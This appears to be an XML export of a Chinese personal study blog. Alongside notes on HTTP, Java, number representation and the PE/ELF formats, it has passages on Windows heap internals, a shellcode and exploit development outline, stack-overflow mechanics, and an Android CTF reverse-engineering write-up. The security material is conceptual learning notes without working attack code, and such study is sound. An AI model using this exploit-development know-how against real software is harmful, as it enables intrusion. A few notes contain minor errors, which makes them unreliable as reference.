    <content type="text"><![CDATA[在大学计算机专业、理工类专业大多学习，C/C++，Java这些开发语言，Android, iOS也有不少同学买书或下载视频学习，但是最后都是没有结果。 把编程开发学习当作一个技能来学习，而不是大学中的学习。中学、大学的学习目标是为了考试，完成学分。了解习得性的技能学习的规律。即强化训练，反复训练。没有一定强度的反复操练是不可能掌握一门技能。 完成代码量的训练，如果要定一个量的话是10000行。 你可以想一想大学里学C, C++, C#写了多少代码？很多同学是不超过200行。 一定要做项目。每天完成一些练习、Demo，还不够。把这个项目当作你独立的作品来完成。 每天写日志、写总结。用markdown、博客来写，记录你学习过程中的问题、思路和成就。 基础知识：网络爬虫，是一种按照一定的规则，自动的抓取万维网信息的程序或者脚本。 搜索引擎工作原理 第一步：抓取网页(spider) 搜索引擎通过特定规律抓取网页，这种特殊规律体现在Robots协议(网络爬虫排除标准)中，网站通过Robot协议告诉搜索引擎哪些页面可以被抓取，哪些不能。查看Robots协议的方法是在网址后加上”/robots.txt” 第二步：数据存储 搜索引擎通过spider跟踪链接爬行到网页，并将爬行的数据存入原始页面数据库。 第三步：预处理 搜索引擎将蜘蛛抓取回来的页面，进行各种步骤的预处理。如⒈提取文字 ⒉中文分词 ⒊去停止词 ⒋消除噪音（搜索引擎需要识别并消除这些噪声，比如版权声明文字、导航条、广告等……） 5.正向索引 6.倒排索引 7.链接关系计算 8.特殊文件处理。除了HTML文件外，搜索引擎通常还能抓取和索引以文字为基础的多种文件类型，如 PDF、Word、WPS、XLS、PPT、TXT 文件等。 第四步：排名，提供检索服务 聚焦爬虫与通用爬虫 聚焦爬虫是一个自动下载网页的程序，它根据既定的抓取目标，有选择的访问万维网上的网页与相关的链接，获取所需要的信息。与通用爬虫(general purpose web crawler)不同，聚焦爬虫并不追求大的覆盖，而将目标定为抓取与某一特定主题内容相关的网页，为面向主题的用户查询准备数据资源。 基本原理爬虫是 模拟用户在浏览器或者某个应用上的操作，把操作的过程、实现自动化的程序。 输入url对服务器发起请求后，简单来说将经历四个步骤： 查找域名对应的IP地址 向IP对应的服务器发出请求 服务器响应请求，发回网页内容 浏览器解析网页内容 网络爬虫本质上就是浏览器的http请求，浏览器与爬虫都通过相同的方式来获取网页，但是网络爬虫所做的相当于将浏览器的功能批量执行，通过指定url直接返回符合查找规律的数据，而不用用户人工获取。 HTTP协议：即超文本传输协议，是一种发布和接受超文本链接HTML的方法。 HTTP协议基于TCP协议，TCP/IP协议参考模型如上。http为应用层的协议，默认其端口号为80，https的端口号是443. http操作的具体过程： 地址解析：从url中分离出协议名，主机名，端口，对象路径等部分,域名系统DNS解析域名也是在这一步。 封装HTTP请求包：将以上部分结合本机信息(IP等)，封装成一个HTTP请求包， 封装成TCP包，建立TCP连接（三次握手）：HTTP协议是比TCP更高级的应用层协议，根据规则，只有低层协议建立之后，才能进行更高层协议的连接，所以在HTTP开始工作之前，客户机的web浏览器首先通过网络与服务器通过TCP协议建立连接。一般TCP连接的端口号是80，但在这是8080. 客户机发送请求命令：建立连接后，客户机发送http请求请求给服务器，(具体操作，请求的格式，状态码，get/post在此处不深究。) 服务器相应：服务器接到请求后，给予相应的http相应。 服务器关闭TCP连接：一般情况下，一旦Web服务器向浏览器发送了请求数据，它就要关闭TCP连接。 HTTPS（全称：Hypertext Transfer Protocol over Secure Socket Layer），是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL。其所用的端口号是443。 Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息. GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx?name=test1&amp;id=123456. POST方法是把提交的数据放在HTTP包的Body中. GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制. GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。 GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码. 一个URL的请求过程：当你在浏览器输入URL http://www.website.com 的时候，浏览器发送一个Request去获取 http://www. website.com的html. 服务器把Response发送回给浏览器.浏览器分析Response中的 HTML，发现其中引用了很多其他文件，比如图片，CSS文件，JS文件。浏览器会自动再次发送Request去获取图片，CSS文件，或者JS文件。当所有的文件都下载成功后， 网页就被显示出来了。 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作 2** 成功，操作被成功接收并处理 3** 重定向，需要进一步的操作以完成请求 4** 客户端错误，请求包含语法错误或无法完成请求 5** 服务器错误，服务器在处理请求的过程中发生了错误 最常用的响应状态码 ◆200 (OK): 找到了该资源，并且一切正常。 ◆301(Moved Permanently): 客户请求的文档在其他地方，新的URL在Location头中给出，浏览器应该自动地访问新的URL。 ◆302 (Found): 类似于301，但新的URL应该被视为临时性的替代，而不是永久性的。 ◆304 (NOT MODIFIED): 该资源在上次请求之后没有任何修改。这通常用于浏览器的缓存机制。 ◆400 (Bad Request): 请求出现语法错误。 ◆403 (FORBIDDEN): 客户端未能获得授权。这通常是在401之后输入了不正确的用户名或密码。 ◆404 (NOT FOUND): 在指定的位置不存在所申请的资源。 ◆500 (Internal Server Error): 服务器遇到了意料不到的情况，不能完成客户的请求 ◆503 (Service Unavailable): 服务器由于维护或者负载过重未能应答。例如，Servlet可能在数据库连接池已满的情况下返回503。服务器返回503时可以提供一个Retry-After头 工作流程 首先选取一部分精心挑选的种子URL； 将这些URL放入待抓取URL队列； 从待抓取URL队列中取出待抓取在URL，解析DNS，并且得到主机的ip，并将URL对应的网页下载下来，存储进已下载网页库中。此外，将这些URL放进已抓取URL队列。 分析已抓取URL队列中的URL，分析其中的其他URL，并且将URL放入待抓取URL队列，从而进入下一个循环。]]></content>
  </entry>
  <entry>
    <title><![CDATA[2019/9/30]]></title>
    <url>%2F2019%2F09%2F20%2FJava%2F</url>
    <content type="text"><![CDATA[Java0.public是为了公开给其他类存取，class是声明类，Myfirst是类的名称。 main为方法名，String[] agrs表示传string的字符串给此方法当参数，命名为args。 Java的源文件为.java，编译之后的.class文件为可执行文件。 12345public class Myfisrt&#123; public static void main (String[] args)&#123; System.out.print(&quot;HelloWorld!&quot;); &#125;&#125; 1.for each循环 123456int[] ns =&#123;1,2,3&#125;for (int n :ns)&#123; System.out.println(n);//用于将数组中的元素遍历&#125; 2.Arrays.toString()函数 1234int[] ns = &#123;1,2,3&#125;System.out.println(Arrays.toString(ns));//此函数直接将数组中元素遍历 3.Arrays.sort()函数，对数组进行排序，参数为数组名。 4.Arrays.deepToString()用于打印二维数组的函数。 5.break会跳出当前循环，也就是整个循环都不会执行了。而continue则是提前结束本次循环，直接继续执行下次循环。 6.Substring(Beginindex，Endindex)函数，对字符串进行剪切。起始索引从零开始，结束索引从1开始。剪切第一个字符，则参数为0，1. 7.Java中的String一旦被定义就无法改变，只能重新定义一个变量来保存。 8.继承：当定义的新class包含了已有class的字段与方法时，即可使用继承(extends)实现代码复用。格式：class 新类名 extends 旧类名。前者称为父类，后者称为子类。 继承的类无法访问其父类的private字段与方法，除非把private改为protected，则可被其子类以及子类的子类访问。 一般情况下可以直接引用父类中的方法与字段，但如果父类没有默认的构造方法，子类就必须显式调用super(),并给出参数以便让编译器定位到父类的一个合适的构造方法。 9.注意String与string，Double与double的区别。 类与对象类的定义定义一个class [类修饰符] class [类名] [extends 父类，implements 接口]{ //成员变量 //成员方法 //构造器 //…… } 类修饰符：public，protected，private，abstract，static，final，strictfp。 成员变量声明成员变量： [修饰符] 数据类型 变量名 = [初始化值] 12345public class Student&#123; private String name; protected float score; String ID;&#125; 变量分类： 成员变量：类似C语言中全局变量，在整个类中都有效。 局部变量：在该代码块/该方法中有效。 参数变量：在该方法或catch代码块中有效。 变量修饰符： public protected private 设定成员变量的访问权限，无法修饰局部变量与参数变量 static 只能够修饰成员变量，不能够修饰局部变量与参数变量，由static修饰的成员变量为静态成员变量，反之为非静态成员变量（实例变量） final常量 transient 只能修饰成员变量，序列化时不会被保存 volatile 只能修饰成员变量，多线程相关 所有变量在声明时不用初始化，但在使用前必须初始化，否则编译错误。 成员方法 [修饰词] 返回类型 方法名 ([参数1，参数2，…]) [throws 异常]{ 方法实现 } setter方法和getter方法： 出于封装考虑，某些class的成员变量通常都声明为private变量，无法直接访问此对象的private属性，通常的做法就是：为private的成员变量声明public的访问接口，称为setter方法与getter方法。 setter： 命名方法：set+变量名，such as setName/setScore；setter方法用于赋值，返回类型都为void getter： 命名方法：get+变量名，such as getName/getScore ；getter方法用于取值，无需输入参数，但是返回类型一定是该成员变量的数据类型。 public protected private 访问控制修饰符，用于设定成员方法的访问权限 abstract 修饰的方法叫抽象方法， 抽象方法只有方法的声明部分， 没有方法体部 分，也就不提供方法的实现 重载Java允许同一个类中定义多个同名方法，只要其形参列表不同即可。如果一个类中包含了两个或者两个以上方法名相同的方法，但是形参列表不同，这种情况被称为重载overload。 方法重载的要求是同一个类中方法名相同，参数列表不同。方法的其他部分如返回值类型/修饰符等，与方法重载无关。实际调用时，根据实参的类型来决定调用哪一个方法。 Tips Java作为面向对象的语言，同样可以描述一个事物的多种形态。如Student类继承了Person类，一个Student的对象便既是Student，又是Person。 123456 Person ming = new Person(); ......class Person &#123; private String name; private int age;&#125; 对象与类相对应，第一行代码Person ming = new Person()相当于创建了一个名为ming的对象，具有name(String)和age(int)两种属性。]]></content>
  </entry>
  <entry>
    <title><![CDATA[堆溢出利用]]></title>
    <url>%2F2019%2F09%2F08%2F%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[堆与栈的区别：堆基础堆与栈的区别： 堆是一种在程序运行时动态分配的内存，所谓动态分配是指所需内存大小在程序设计时并不能事先决定，需要在程序运行时参考用户的反馈。 堆在使用时需要程序员使用专门的函数进行申请，如C语言中的malloc函数，是分配内存的函数，堆内存申请有可能成功，也有可能失败，这与申请的内存大小，机器性能和当前运行环境有关。 一般使用一个堆指针来使用申请得到的内存，读写释放都通过这个指针来完成。 使用完毕后需要把堆指针传递给堆释放函数回收这片内存，否则会造成内存泄露，典型的堆释放函数如free，delete。 现代操作系统的堆数据结构一般包括堆块与堆表两类： 堆块：出于性能的考虑，堆区的内存按大小组织成块，以块为单位进行标识，而不是以传统的字节进行标识。一个堆块包括两个部分：块首与块身。块首是一个堆块头部的几个字节，用来标识这个堆块自身的信息，如大小，是否闲置等。块身是紧跟随在块首后的部分，也是最终非陪给用户使用的数据区。 堆表，堆表一般位于堆区的起始位置，用于索引堆区中所有堆块的重要信息，包括堆块的位置，大小，是否被占用等等。（堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块，保证堆分配效率的关键。堆表的设计会采用二叉树等高级数据结构用于优化查找效率。 在Windows中，占用态的堆块被使用它的程序索引，而堆表只索引空闲的堆块。其中最重要的堆表有两种： 空闲双向链表Freelist/快速单向链表Lookaside 空闲双向链表空闲堆块的块首包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块大小不同，空表总共被分为128条(即指针数组中的每个元素包含一条双向链表)。 堆区一开始的堆表区中有一个128项的指针数组，被称为空表索引(Freelist Array),该数组的每一项包含两个指针，用于标识一条空表。 空表索引的第二项free[1]标识了堆中所有大小为16字节的空闲堆块，free[2]标识了堆中所有大小为24字节的空闲堆块，依次类推有：空闲堆块大小=索引项*8(字节)。 把空闲堆块按照大小不同链入不同的链表，可以方便堆管理系统高效检索指定大小的空闲堆块。空表索引的第一项(free[0]所标识的空表)比较特殊，这条双向链表标识了所有大于等于1024字节的堆块。 快速单向链表块表是Windows用来加速堆块分配而采用的一种堆表，块表之所以快，是因为这类单向链表中从来不会发生堆块合并(其中的空闲块块首被设置为占用态，以防止堆块合并)。 快表也有128条，组织结构与空表类似，但是其中的堆块按照单链表组织。块表总是被初始化为空，并且每条快表最多有四个节点，所以很快就会被填满。 堆块分配/堆块释放/堆块合并（Coaleace)分配与释放是在程序提交与执行的，合并是由堆管理系统自动完成的。 堆块分配堆块分配可以分成三类：块表分配，普通空表分配和零号空表分配。 快表分配比较简单，包括寻找到大小匹配的空闲堆块(只有精准匹配时才会使用快表分配，故不存在对块的分割操作)，将其状态修改为占用态，将它从堆表中卸下，最后返回一个指向堆块块身的指针给程序使用。 普通空表分配时，首先寻找最优的空闲块进行分配，再寻找次优的空闲块进行分配，一直寻找到最小能够满足要求的空闲块。？？？？最优到底指的是以什么为标准。 零号空表中，按照大小升序链接大小不同的空闲块，故在分配内存的时候会反向查找最后一个(即链表中最大的一个堆块)，看能否满足要求。如果满足要求，则确定能够成功分配。再从第一个堆块开始从小到大正向搜索最小能够满足条件的堆块(零号空表升序排列的原因)。 当无法找到匹配的最优堆块时(大小完全精准符合)，一个稍大一些的堆会用于分配。这种次优分配发生时，会先从大块中按照请求的大小精准地割出一块进行分配，然后剩下的部分重新分配块首，链入空表，再次可以被索引到。 此处没有考虑堆缓存(heap cache)，低碎片堆(LFH)与虚分配。 堆块释放堆块释放的操作包括将堆块状态改为空闲，链入相应的堆表。所有释放块都链入堆表的末尾，分配的时候也从堆表末尾拿。特殊强调：快表最多有4项。 堆块合并经过反复的申请与释放操作，内存中的堆区可能会产生很多内存碎片。为了合理有效地利用内存，堆系统还能够进行堆块合并操作：当堆管理系统发现两个堆块相邻的时候，就会进行堆块合并操作。 堆块合并包括将两个块从空闲链表中卸下，合并堆块，调整合并后大块的块首信息，将新块重新链入空闲链表。并且对于小于1KB的小块，大于等于1KB小于512KB的大块，大于等于512KB的巨块，有不同的分配与释放的算法，此处不做深入了解，二周目的时候再调试。 堆分配函数之间的调用关系Windows中许多类型的堆分配函数最终都将使用位于ntdll.dll中的RtlAllocateHeap()函数进行分配，这个函数也是在用户态能够看到的最底层的堆分配函数。 调试堆的方法调试栈不同，调试堆时如果直接用OD，Windbg加载程序，会被堆管理函数检测到当前进程处于调试状态。而使用调试态的堆管理策略，调试态的堆管理与常态的堆管理有很大差异： 调试态堆不适用快表，只使用空表分配(我知道这只是演习)。 所有的堆块都被加上了多余的16字节尾部(8个字节的0xAB与8个字节的0x00)用来防止溢出(防止程序溢出而非堆溢出攻击)。 块首的标志不同。 Debug版本与Release版本的区别 Debug通常称为调试版本，通过一系列编译选项的配合，编译的结果通常包含调试信息，但是不做任何优化（性能有影响），目的是为开发人员提供强大的应用程序调试能力，也就是说只有在Debug模式下，我们才可以使用vs所提供的所有的程序调试功能，比如：单步调试中将光标移至变量处即可以获取该变量的实时数据。 Release通常称为发布版本，是为用户使用的，一般客户不允许在发布版本上进行调试，在Release模式下也无法使用vs所有的调试功能。所以不保存调试信息，同时，它往往进行了各种优化，以期达到代码最小和速度最优。为用户的使用提供便利。 调试态的堆就像debug版本的PE,常态堆就像release版本的PE，为了避免程序检测出调试器而使用调试态堆管理策略，我们可以在创建堆之后加入一个人工断点:_asm int 3,然后让程序单独执行。程序把堆初始化后，再用调试器attach进程，就能够看到真实的堆。、 堆分配算法依赖于操作系统版本，编译器版本，编译选项，bulid类型等因素，甚至与虚拟机版本有关。实验环境不恰当，将得到不同的调试结果。难搞啊]]></content>
      <tags>
        <tag>0day安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开发shellcode的艺术]]></title>
    <url>%2F2019%2F09%2F08%2F%E5%BC%80%E5%8F%91shellcode%E7%9A%84%E8%89%BA%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[Shellcode:缓冲区溢出攻击中植入进程的代码 Exploit:计算函数返回地址距离缓冲区的偏移并覆盖，选择指令的地址，最终制作出一个由攻击效果，承载着shellcode的输入字符串位Exploit。 exploit一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他输入，其核心是淹没返回地址，劫持进程的控制权，之后跳转去执行shellcode。与shellcode一定的通用性不同，exploit一般是针对特定漏洞的。 Metasploit通用漏洞测试平台：规范化exploit和shellcode之间的接口，把漏洞利用的过程封装成易用的模块，实现了代码重复利用和模块化，结构化的思想。在这个平台中： 所有的exploit都使用漏洞名称来命名，里面包含有这个漏洞的函数返回地址，所使用的跳转指令等关键信息。 将常用的shellcode(例如用于绑定端口反向连接，执行任意命令)封装成一个个通用的模块，与任意漏洞的Exploit进行组合。 今天电脑不是一般地卡，第二章该调试的操作都还没练习过，这对于学习来说是非常危险的，第三章shellcode开发也得静下心研究。 0X00:定位shellcode 栈帧移位与jmp esp 获取跳板地址 使用跳板定位exploit 0X01:缓冲区的组织 缓冲区的组成 抬高栈顶保护shellcode 使用其他跳转指令 不使用跳转指令 函数返回地址移位 0X02:开发通用的shellcode 定位API的原理 shellcode的加载与调试 动态定位API地址的shellcode 0X03：shellcode编码技术 为什么要对shellcode编码 会变形的shellcode 0X04:简化shellcode]]></content>
      <tags>
        <tag>0day安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机基础知识]]></title>
    <url>%2F2019%2F09%2F08%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[数的存储一直对计算机中数的存储方式一知半解，make a summary today。 source：为什么-1在计算机中的存储是0XFFFFFFFF? 负整数用补码(Two’s-complement)表示的数学原理是:一个整数的补码是其加法逆元（如果将一个数与其加法逆元相加，其结果为0）。 0X00:原码，反码，补码原码表示法规定：用符号位和数值位两部分表示一个带符号数，设字长为n位，最高位为符号位，正数的符号位用0表示，负数的符号位用1表示。其余n-1位数值部分用二进制形式表示。在原码中，零有两种表示形式，00000000为+0，10000000为-0. 原码所能表示的数的范围与二进制的位数(即机器字长)有关，由8位二进制数表示到由16位二进制数表示，能够表示的范围会增大。 反码表示法规定：正数的反码与原码相同，负数的反码是对该数的原码除符号位外各位取反。 补码表示法规定：正数的补码与原码相同，负数的补码是对该数的原码除符号位外各位取反后最末位+1.十六进制数的补码，就是将一个十六进制整数按位取反并+1.简单的方法就是用15减去该数字，最后再+1. 零的补码是唯一的：00000000 补码所能表示的数的范围与二进制的位数(即机器字长)有关，由8位二进制数表示到由16位二进制数表示，能够表示的范围会增大。 任何一个数的补码的补码即是其原码本身。 几种进制（有符号/无符号之间的转换）有符号二进制整数到十进制的转换如果最高位是1，则该数是补码，再次对其求补，得到其正数值。然后把这个数看成一个无符号二进制数，并求它的十进制值。 如果最高位是0，就将其视为无符号二进制整数，并转换为十进制数。 （先辨别了是否是负数） 有符号十进制数到二进制的转换把十进制整数的绝对值转换成二进制数 如果初始十进制数是负数，则在第一步的基础上求其补码。 （先把二进制数表示出来（与数字无关），再判断是否是负数） 有符号十进制数到十六进制的转换把十进制整数的绝对值转换成十六进制数 如果初始十进制数是负数，则在第一步的基础上求其补码。 有符号十六进制数到十进制的转换如果十六进制整数是负数，求其补码，否则保持不变。 把第一步得到的数转换成十进制。如果初始值是负数，则在十进制数前面加上负号。 通过检查十六进制数的最高有效位，就可以知道该十六进制数是正数还是负数。如果最高位&gt;=8,则该数是负数。如果最高位&lt;=7，则该数是正数。 普遍规律：根据符号是否对数字产生影响，若产生影响(负数十六进制/二进制），求其补码。进制转换后再根据初始正负加符号。若不产生影响，（正数十六进制/二进制，任意十进制），直接进制转换，再看初始正负。 句柄进程协程]]></content>
      <tags>
        <tag>底层</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基础知识&栈溢出原理与实践]]></title>
    <url>%2F2019%2F09%2F05%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[0X00:基础知识PE文件概述：PE是Win32平台下的可执行文件遵守的数据格式，常见可执行文件如.exe/.dll都属于PE文件，PE文件格式规定了二进制的机器代码和字符串，菜单，图标等其他信息在可执行文件中如何组织。程序被执行时，系统会按照PE文件格式的约定去准确地定位各种资源，并将其加载入内存的不同区域。 PE文件格式把可执行文件分割成多个数据节(section) .text，由编译器产生，存放着编译产生的二进制机器代码，反汇编和调试的对象。 .data,初始化的数据块，宏定义，全局变量，静态变量。 .idata,所执行的动态链接库等外来函数与文件的信息。 .rsrc,存放程序的资源，如图标，菜单等。 虚拟内存：Windows的物理内存比较复杂，Windows内核Ring0级别才能看到。通常在用户模式下，用调试器看到的内存都是虚拟内存。每个进程都被分配了4GB的内存空间，实际上能够用到的内存空间没有那么多。内存管理器分配给了进程一片假地址/虚拟地址，只有当需要进行实际的内存操作时，内存管理器才会把虚拟地址与物理地址联系起来。 一个512MB的虚拟内存，能够映射出几个进程4GB的虚拟内存，关键在于这几个进程实际用到的内存之和小于512MB. PE文件与虚拟内存之间的映射：1.静态反汇编工具显示的某条文件的指令是相对于磁盘文件而言的，即文件偏移。我们还可能想知道虚拟内存地址VA。 2.动态调试时看到的某条指令是虚拟内存地址，经常需要回到PE文件找到这条指令的机器码。 四个概念：注意是在内存中还是在PE文件中 1.文件偏移地址(File Offset)静态 数据在PE文件中的地址叫做文件偏移地址，是文件在磁盘上存放时，相对于文件开头的偏移。 2.装载基址(Image Base)动态 PE装入内存中时的基地址，默认情况下装载基址为0X00400000，DLL文件的装载基址是0X10000000. 3.虚拟内存地址(Virtual Address)动态 PE文件中的指令被装入内存之后的地址。 4.相对虚拟地址(Relative Virtual Adress)动态 相对虚拟地址是内存地址相对于映射基址的偏移量。 所以有VA=Image Base+RVA 默认情况下将PE文件的0字节映射到虚拟内存的0x00400000，这个地址就是装载基址。 文件偏移是相对于文件开始处0字节的偏移，RVA是相对于装载基址0x00400000的偏移。 操作系统在装载PE文件时基本上保持PE文件中的各种数据结构，所以文件偏移地址和RVA相对虚拟地址有很大的一致性。不完全一致是因为文件数据的存放单位和内存数据的存放单位不同。 PE文件中的数据在未装载入内存之前，按照磁盘数据存放，以0X200字节为单位。当一个数据节(section)不足0X200时，不足的部分将被0X00填充。所以PE数据节的大小永远是0X200的整数倍。 PE文件中的数据被装载入内存之后，按照内存数据的标准以0X1000为单位进行存放，所以内存中的数据节大小永远是0X1000的整数倍。 由于数据在PE文件和内存中的存储单位不同，所以文件偏移和RVA只是”有很大的一致性”。由于上述差异，进行文件偏移到虚拟内存地址之间的转换要看所转换的地址属于第几个节内(在数据节的前面还是后面)。 文件偏移地址=虚拟内存地址VA-装载基址(Image Base)-节偏移=RVA-节偏移。 0X01:栈溢出原理与实战内存四区(注意是内存不是PE文件)： 代码区：存储被装入执行的二进制机器代码，CPU从这个区域取指令执行。 数据区：存储全局变量等。 堆区：进程在堆区动态地请求一定大小的内存，并在用完之后free。动态地分配和回收是堆区的特点。 栈区：用于动态地存储函数之间的调用关系。 系统栈是对内存中所有栈的统称，栈帧是指一个函数开辟出的栈空间。严格来说，栈帧底部和栈底部不是同一概念。所以在对EBP进行说明时：它指向当前位于系统栈最上边一个栈帧的底部，而不是系统栈的底部。ESP所指的栈帧底部与系统栈底部是同一位置。 在函数栈帧中，包含： 局部变量：为函数局部变量开辟的内存空间。 栈帧状态值：保存前栈帧的顶部和底部(实际上只保存底部，前栈帧的顶部可以通过堆栈平衡计算得到？。)，用于在本栈帧被弹出后恢复上一个栈帧。 函数返回地址：保存当前函数调用前的EIP信息(不准确？)就是函数调用前的指令位置，即函数调用前的指令位置，这样函数返回时能够恢复到函数被调用前的代码区中继续执行指令。 函数的栈帧大小并不确定，与其对应的局部变量的多少有关。在调试过程中也能发现，在函数运行的过程中，其栈帧大小也在不断变化。 函数调用的过程包含以下几个步骤： 参数入栈：将参数从右向左依次压入系统栈中。 返回地址入栈：将当前代码区调用指令的下一条指令压入栈中，待函数返回时pop出返回地址为EIP指向继续执行。 代码区跳转：处理器从当前代码区跳转到被调用函数的入口处。 栈帧调整： PUSH EBP(保存当前栈帧状态值，备后面回复本栈帧时使用) MOV EBP,ESP(将当前栈帧切换到新栈帧，更新栈帧底部) SUB ESP,XXX(给新栈帧分配空间,抬高栈顶) 函数的返回过程包含如下几个步骤： 保存返回值：通常将函数的返回值保存在寄存器EAX中 弹出当前栈帧，恢复上一个栈帧，具体如下： 在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前的栈空间。 将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复上一个栈帧。 将函数返回地址弹给EIP寄存器。 4.最后一步——跳转：按照函数返回地址跳回母函数中继续执行。 注意CALL指令和RETN指令的实际操作 我的误区： 返回地址和EBP并不是同一概念与功能。CALL指令之后，先将返回地址压入栈中再PUSH EBP(旧栈帧)，EBP对函数返回并无任何贡献。 MOV EBP,ESP指令并不会对已经存放在栈中的EBP的值进行改变，是对寄存器EBP的值进行改变。注意当前栈帧保存的EBP值永远是前栈帧的EBP。 压入栈中的EBP目的在于使执行完函数后，栈底恢复到上一个状态。压入栈中的返回地址目的在于使执行完函数后，EIP恢复到函数调用前的状态，继续沿main函数执行 关于栈帧的划分，在不同书中有不同的约定。本书中坚持栈帧底部存放前栈帧EBP,栈帧顶部存放返回地址。 在观察内存的时候应该注意”内存数据”与”数值数据”的区别。在调试环境中，内存由低到高分布，就像Win32系统在内存中由低位向高位存储一个四字节的双字(Dump窗口的十六进制两位)，但是在作为”数值数据”应用的时候，是由高位字节向低位字节进行解释的。所以在调试环境中，内存数据中的双字与我们通常使用的数值数据是以双字为单位逆序过的。出于阅读方便，OD已经自动在栈中进行了反转，在栈窗口所看到的数据是数值数据而非内存数据。所以在栈内看数据时，从左向右对于左边的地址偏移依次为3，2，1，0.]]></content>
      <tags>
        <tag>0day安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git的大小写问题]]></title>
    <url>%2F2019%2F09%2F05%2FGit%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%86%99%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[使用 Hexo 部署博客到 Github Pages 时经常会遇到文件夹大小写问题导致的 404问题，如tag标签无法访问返回404。 原因 git 默认忽略文件名大小写，所以即使文件夹大小写变更，git 也检测不到。 解决办法 进入到博客项目中 .deploy_git文件夹，修改 .git 下的 config 文件，将 ignorecase=true 改为 ignorecase=false。]]></content>
      <tags>
        <tag>报错</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Android逆向入门]]></title>
    <url>%2F2019%2F08%2F31%2FAndroid%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[关于Android逆向解题过程的总结 0X00:功能测试首先将APK文件拖入模拟器中，测试其功能，根据弹出的字符串，寻找解题的突破口。 0X01:主活动首先通过Androidmanifest.xml的找到Mainactivity，再对其中的代码进行逆向分析。 0X02:特殊情况隐藏mainactivity 0X03:几种工具的优势能够显示出被调用过的函数 0X04:具体题目攻防世界APP1： 首先用jadx打开，寻找到其中的Androidmanifest.xml，通过intent-filter找到主活动。 对Java代码进行分析 找到关键代码 通过Buildconfig找可能有用的信息，如该题中的versionName和versionCode，分别为X&lt;cP[?PHNB&lt;P?aj和15. charAt(i)函数，输出字符串中的第i个数字。可知这句代码的意思是：将输入字符串的第1~i个字符分别和versionCode与versionName异或之后的结果进行相等比较。如果不相等的话，输出”再接再厉，加油！” 于是Python脚本如下： s=”X&lt;cP[?PHNB&lt;P?aj” flag=” “ for i in s: ​ flag+=chr(ord(i)^15)//将s中的字符逐个转化为数字，与15进行异或后，再以字符形式输出。 ​ print(flag) 攻防世界App2： 观察程序功能 jadx打开 由第一个活动传到了第二个活动,观察到： 进入这个class 可见是native层的调用 于是改apk后缀为zip对.so进行分析，找到其中的lib，任意对其中一项分析。 可见是AES thisisateatkey== 作为密钥解密得：]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux ELF]]></title>
    <url>%2F2019%2F08%2F21%2FLinux-ELF%2F</url>
    <content type="text"><![CDATA[Linux 可执行文件格式 ELF （Executable Linkable Format）文件的三种类型： 可重定位文件（Relocatable file） 包含了代码和数据，可以和其他目标文件链接生成一个可执行文件或共享目标文件。 elfDemo.o 可执行文件（Executable File） 包含了可以直接执行的文件。 elfDemo_static.out 共享目标文件（Shared Object File） 包含了用于链接的代码和数据，分两种情况。一种是链接器将其与其他的可重定位文件和共享目标文件链接起来，生产新的目标文件。另一种是动态链接器将多个共享目标文件与可执行文件结合，作为进程映像的一部分。 elfDemo.out libc-2.25.so 可以看到，在这个简化的 ELF 文件中，开头是一个“文件头”，之后分别是代码段、数据段和.bss段。程序源代码编译后，执行语句变成机器指令，保存在.text段；已初始化的全局变量和局部静态变量都保存在.data段；未初始化的全局变量和局部静态变量则放在.bss段。 把程序指令和程序数据分开存放有许多好处，从安全的角度讲，当程序被加载后，数据和指令分别被映射到两个虚拟区域。由于数据区域对于进程来说是可读写的，而指令区域对于进程来说是只读的，所以这两个虚存区域的权限可以被分别设置成可读写和只读，可以防止程序的指令被改写和利用。 ELF 文件结构 ELF 文件头（ELF Header） 在目标文件格式的最前面，包含了描述整个文件的基本属性。 程序头表（Program Header Table） 是可选的，它告诉系统怎样创建一个进程映像。可执行文件必须有程序头表，而重定位文件不需要。 段（Section） 包含了链接视图中大量的目标文件信息。 段表（Section Header Table） 包含了描述文件中所有段的信息。]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反静态调试]]></title>
    <url>%2F2019%2F07%2F21%2F%E5%8F%8D%E9%9D%99%E6%80%81%E8%B0%83%E8%AF%95%2F</url>
